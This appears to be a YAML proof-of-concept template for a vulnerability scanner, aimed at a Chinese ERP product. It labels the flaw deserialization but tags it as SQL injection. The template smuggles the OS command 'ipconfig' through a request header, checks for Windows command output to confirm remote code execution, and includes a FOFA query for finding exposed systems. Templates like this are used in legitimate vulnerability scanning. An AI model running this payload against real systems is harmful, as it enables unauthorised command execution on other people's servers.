id: poc-yaml-yun-shi-kong-erp-public-js-unserialization
info:
  name: 云时空社会化商业ERP public.js 反序列化漏洞
  severity: critical
  tags:
  - sql-injection
  finger: 云时空社会化商业ERP系统
  fofa: title="云时空社会化商业ERP系统"
requests:
- method: GET
  path: /static/js/public.js
  headers:
    X-Token-Data: ipconfig
    Cookie: 
  expression: status_code == 200 && contains(body,"Windows IP") && contains(body,"DNS")
    && contains(body,"IPv4") && !contains(headers,"Content-Type")
variables: {}
transport: http
